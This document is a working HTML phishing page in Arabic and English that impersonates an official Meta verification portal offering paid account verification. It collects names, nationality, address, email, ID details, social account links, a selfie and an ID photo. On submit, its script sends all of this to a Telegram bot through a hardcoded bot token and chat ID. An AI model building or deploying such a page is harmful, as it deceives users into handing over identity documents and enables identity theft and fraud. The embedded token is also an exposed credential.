<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة توثيق ميتا | Meta Verification</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; }
        .gradient-text {
            background: linear-gradient(90deg, #0668E1, #E1306C);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen pb-10">

    <!-- Header -->
    <header class="bg-white shadow-md mb-8">
        <div class="max-w-4xl mx-auto px-4 py-4 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <i class="fa-brands fa-meta text-3xl text-blue-600"></i>
                <h1 class="text-2xl font-bold text-gray-800" id="pageTitle">بوابة التوثيق الرسمية</h1>
            </div>
            <button onclick="toggleLanguage()" class="bg-blue-50 text-blue-600 px-4 py-2 rounded-lg font-semibold hover:bg-blue-100 transition">
                <i class="fa-solid fa-globe"></i> <span id="langBtn">English</span>
            </button>
        </div>
    </header>

    <!-- Main Form -->
    <main class="max-w-4xl mx-auto px-4">
        <form id="verificationForm" class="bg-white rounded-2xl shadow-lg p-6 md:p-8 space-y-8">
            
            <!-- Personal Info Section -->
            <div>
                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec1Title"><i class="fa-solid fa-user-check text-blue-500 ml-2"></i>المعلومات الشخصية</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblArName">الاسم بالعربي</label>
                        <input type="text" id="arName" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblEnName">الاسم بالإنجليزي</label>
                        <input type="text" id="enName" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none text-left" dir="ltr">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblNationality">الجنسية</label>
                        <input type="text" id="nationality" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblEmail">الإيميل الخاص بك</label>
                        <input type="email" id="email" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none text-left" dir="ltr">
                    </div>
                    <div class="md:col-span-2">
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblLocation">موقع السكن الحالي</label>
                        <input type="text" id="location" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
                    </div>
                </div>
            </div>

            <!-- Identity Section -->
            <div>
                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec2Title"><i class="fa-solid fa-id-card text-blue-500 ml-2"></i>معلومات الهوية</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIdType">نوع الهوية</label>
                        <select id="idType" class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
                            <option value="بطاقة شخصية" id="optId">بطاقة شخصية</option>
                            <option value="جواز سفر" id="optPassport">جواز سفر</option>
                        </select>
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblDob">تاريخ الميلاد</label>
                        <input type="date" id="dob" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIdIssue">تاريخ إصدار الهوية</label>
                        <input type="date" id="idIssue" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIdExpiry">تاريخ انتهاء الهوية</label>
                        <input type="date" id="idExpiry" required class="w-full border rounded-lg p-3 focus:ring-2 focus:ring-blue-400 outline-none">
                    </div>
                </div>
            </div>

            <!-- Platforms & Links Section -->
            <div>
                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec3Title"><i class="fa-solid fa-link text-blue-500 ml-2"></i>الحسابات والروابط</h2>
                
                <label class="block text-sm font-semibold text-gray-600 mb-2" id="lblPlatforms">اختر الحسابات المراد توثيقها (مع الرسوم الشهرية)</label>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mb-6">
                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
                        <input type="checkbox" name="platform" value="فيسبوك (10$)" class="w-5 h-5 text-blue-600 rounded">
                        <i class="fa-brands fa-facebook text-blue-600 text-xl"></i> <span class="font-semibold">فيسبوك (10$)</span>
                    </label>
                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
                        <input type="checkbox" name="platform" value="انستجرام (10$)" class="w-5 h-5 text-pink-600 rounded">
                        <i class="fa-brands fa-instagram text-pink-600 text-xl"></i> <span class="font-semibold">انستجرام (10$)</span>
                    </label>
                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
                        <input type="checkbox" name="platform" value="واتساب رسمي (10$)" class="w-5 h-5 text-green-500 rounded">
                        <i class="fa-brands fa-whatsapp text-green-500 text-xl"></i> <span class="font-semibold">واتساب رسمي (10$)</span>
                    </label>
                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
                        <input type="checkbox" name="platform" value="واتساب أعمال (20$)" class="w-5 h-5 text-green-600 rounded">
                        <i class="fa-brands fa-whatsapp text-green-600 text-xl"></i> <span class="font-semibold">واتساب أعمال (20$)</span>
                    </label>
                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
                        <input type="checkbox" name="platform" value="ثريدز (10$)" class="w-5 h-5 text-black rounded">
                        <i class="fa-brands fa-threads text-black text-xl"></i> <span class="font-semibold">ثريدز (10$)</span>
                    </label>
                    <label class="flex items-center gap-2 p-3 border rounded-lg cursor-pointer hover:bg-gray-50">
                        <input type="checkbox" name="platform" value="حساب ميتا الرسمي (20$)" class="w-5 h-5 text-blue-800 rounded">
                        <i class="fa-brands fa-meta text-blue-800 text-xl"></i> <span class="font-semibold">ميتا الرسمي (20$)</span>
                    </label>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblFbLink">رابط الفيسبوك</label>
                        <input type="url" id="fbLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="https://facebook.com/...">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblIgLink">رابط الانستجرام</label>
                        <input type="url" id="igLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="https://instagram.com/...">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblWaLink">رقم الواتساب (مع الرمز الدولي)</label>
                        <input type="text" id="waLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="+967...">
                    </div>
                    <div>
                        <label class="block text-sm font-semibold text-gray-600 mb-1" id="lblThLink">رابط الثريدز</label>
                        <input type="url" id="thLink" class="w-full border rounded-lg p-3 text-left outline-none focus:ring-2 focus:ring-blue-400" dir="ltr" placeholder="https://threads.net/...">
                    </div>
                </div>
            </div>

            <!-- Attachments Section -->
            <div>
                <h2 class="text-xl font-bold border-b pb-2 mb-4 text-gray-700" id="sec4Title"><i class="fa-solid fa-file-arrow-up text-blue-500 ml-2"></i>المرفقات</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:bg-gray-50 transition">
                        <i class="fa-solid fa-camera text-3xl text-gray-400 mb-2"></i>
                        <label class="block text-sm font-semibold text-gray-600 mb-2 cursor-pointer" id="lblSelfie">صورة سيلفي لك</label>
                        <input type="file" id="selfiePhoto" accept="image/*" required class="w-full text-sm">
                    </div>
                    <div class="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:bg-gray-50 transition">
                        <i class="fa-solid fa-id-card-clip text-3xl text-gray-400 mb-2"></i>
                        <label class="block text-sm font-semibold text-gray-600 mb-2 cursor-pointer" id="lblIdPhoto">صورة الهوية</label>
                        <input type="file" id="idPhoto" accept="image/*" required class="w-full text-sm">
                    </div>
                </div>
            </div>

            <!-- Submit Button -->
            <button type="submit" id="submitBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg transition duration-300 flex justify-center items-center gap-2">
                <i class="fa-solid fa-paper-plane"></i> <span id="btnText">إرسال طلب التوثيق</span>
            </button>
            <p id="loadingMsg" class="text-center text-blue-600 font-bold hidden">جاري الإرسال، يرجى الانتظار...</p>
        </form>
    </main>

    <!-- JavaScript -->
    <script>
        // إعدادات البوت الخاص بك
        const BOT_TOKEN = '8868584934:AAE0jkikO04FtbUbRh8jrwR3ComrJ3md_ho';
        const CHAT_ID = '8868584934';

        // نظام اللغات
        let currentLang = 'ar';
        const translations = {
            ar: {
                pageTitle: "بوابة التوثيق الرسمية", langBtn: "English",
                sec1Title: "المعلومات الشخصية", lblArName: "الاسم بالعربي", lblEnName: "الاسم بالإنجليزي", lblNationality: "الجنسية", lblEmail: "الإيميل الخاص بك", lblLocation: "موقع السكن الحالي",
                sec2Title: "معلومات الهوية", lblIdType: "نوع الهوية", optId: "بطاقة شخصية", optPassport: "جواز سفر", lblDob: "تاريخ الميلاد", lblIdIssue: "تاريخ إصدار الهوية", lblIdExpiry: "تاريخ انتهاء الهوية",
                sec3Title: "الحسابات والروابط", lblPlatforms: "اختر الحسابات المراد توثيقها (مع الرسوم الشهرية)", lblFbLink: "رابط الفيسبوك", lblIgLink: "رابط الانستجرام", lblWaLink: "رقم الواتساب", lblThLink: "رابط الثريدز",
                sec4Title: "المرفقات", lblSelfie: "صورة سيلفي لك", lblIdPhoto: "صورة الهوية",
                btnText: "إرسال طلب التوثيق", loadingMsg: "جاري الإرسال، يرجى الانتظار...", successMsg: "تم إرسال طلبك بنجاح!"
            },
            en: {
                pageTitle: "Meta Verification Portal", langBtn: "العربية",
                sec1Title: "Personal Information", lblArName: "Name in Arabic", lblEnName: "Name in English", lblNationality: "Nationality", lblEmail: "Your Email", lblLocation: "Current Residence",
                sec2Title: "Identity Details", lblIdType: "ID Type", optId: "National ID", optPassport: "Passport", lblDob: "Date of Birth", lblIdIssue: "ID Issue Date", lblIdExpiry: "ID Expiry Date",
                sec3Title: "Accounts & Links", lblPlatforms: "Select Platforms for Verification (Monthly Fees)", lblFbLink: "Facebook Link", lblIgLink: "Instagram Link", lblWaLink: "WhatsApp Number", lblThLink: "Threads Link",
                sec4Title: "Attachments", lblSelfie: "Selfie Photo", lblIdPhoto: "ID Photo",
                btnText: "Submit Application", loadingMsg: "Sending, please wait...", successMsg: "Your application has been submitted successfully!"
            }
        };

        function toggleLanguage() {
            currentLang = currentLang === 'ar' ? 'en' : 'ar';
            document.documentElement.lang = currentLang;
            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
            
            for (const key in translations[currentLang]) {
                const element = document.getElementById(key);
                if (element) {
                    if(element.tagName === 'INPUT' || element.tagName === 'SELECT') continue; 
                    if(element.childNodes.length > 1) {
                        element.lastChild.textContent = translations[currentLang][key];
                    } else {
                        element.textContent = translations[currentLang][key];
                    }
                }
            }
        }

        // دالة الإرسال إلى تلجرام
        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const loadingMsg = document.getElementById('loadingMsg');
            submitBtn.classList.add('hidden');
            loadingMsg.classList.remove('hidden');

            // تجميع الخيارات المحددة
            const checkboxes = document.querySelectorAll('input[name="platform"]:checked');
            let selectedPlatforms = [];
            checkboxes.forEach((cb) => { selectedPlatforms.push(cb.value); });

            // تنسيق الرسالة النصية
            const messageText = `
📌 *طلب توثيق جديد* 📌
👤 الاسم بالعربي: ${document.getElementById('arName').value}
🔤 الاسم بالإنجليزي: ${document.getElementById('enName').value}
🌍 الجنسية: ${document.getElementById('nationality').value}
📍 السكن: ${document.getElementById('location').value}
📧 الإيميل: ${document.getElementById('email').value}

🪪 *معلومات الهوية:*
- النوع: ${document.getElementById('idType').value}
- الميلاد: ${document.getElementById('dob').value}
- الإصدار: ${document.getElementById('idIssue').value}
- الانتهاء: ${document.getElementById('idExpiry').value}

📱 *المنصات المطلوبة:*
${selectedPlatforms.length > 0 ? selectedPlatforms.join('\n') : 'لم يتم تحديد منصات'}

🔗 *الروابط:*
- فيسبوك: ${document.getElementById('fbLink').value || 'لا يوجد'}
- انستجرام: ${document.getElementById('igLink').value || 'لا يوجد'}
- واتساب: ${document.getElementById('waLink').value || 'لا يوجد'}
- ثريدز: ${document.getElementById('thLink').value || 'لا يوجد'}
            `;

            try {
                // 1. إرسال النص أولاً
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });

                // 2. دالة لرفع الصور
                const sendPhoto = async (fileInputId, caption) => {
                    const file = document.getElementById(fileInputId).files[0];
                    if (file) {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('document', file);
                        formData.append('caption', caption);
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                            method: 'POST',
                            body: formData
                        });
                    }
                };

                // إرسال السيلفي ثم الهوية
                await sendPhoto('selfiePhoto', '📷 صورة السيلفي للمتقدم: ' + document.getElementById('arName').value);
                await sendPhoto('idPhoto', '🪪 صورة هوية المتقدم');

                alert(translations[currentLang].successMsg);
                document.getElementById('verificationForm').reset();
            } catch (error) {
                alert('حدث خطأ أثناء الإرسال. تأكد من اتصالك بالإنترنت.');
                console.error(error);
            } finally {
                submitBtn.classList.remove('hidden');
                loadingMsg.classList.add('hidden');
            }
        });
    </script>
</body>
</html>
